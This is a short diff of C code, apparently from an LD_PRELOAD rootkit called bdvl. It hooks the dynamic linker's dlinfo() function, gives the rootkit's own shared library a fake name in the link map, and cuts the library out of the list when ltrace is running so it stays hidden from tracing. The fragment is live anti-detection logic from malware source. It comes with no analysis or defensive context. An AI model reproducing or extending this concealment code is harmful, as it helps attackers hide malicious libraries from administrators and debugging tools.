@@ -20,9 +20,9 @@ int dlinfo(void *handle, int request, void *p){
             if(strcmp(loop->l_name, "\0")){
                 if(strstr(BDVLSO, loop->l_name)){
                     bdvl_linkmap = loop;
-                    loop->l_name = strdup(LINKMAP_NAME);
+                    loop->l_name = strdup(FAKE_LINKMAP_NAME);
 
-                    if(process(LTRACE_STR)){
+                    if(process("ltrace")){
                         atexit(repair_linkmap);
                         loop->l_prev->l_next = loop->l_next;
                         loop->l_next->l_prev = loop->l_prev;
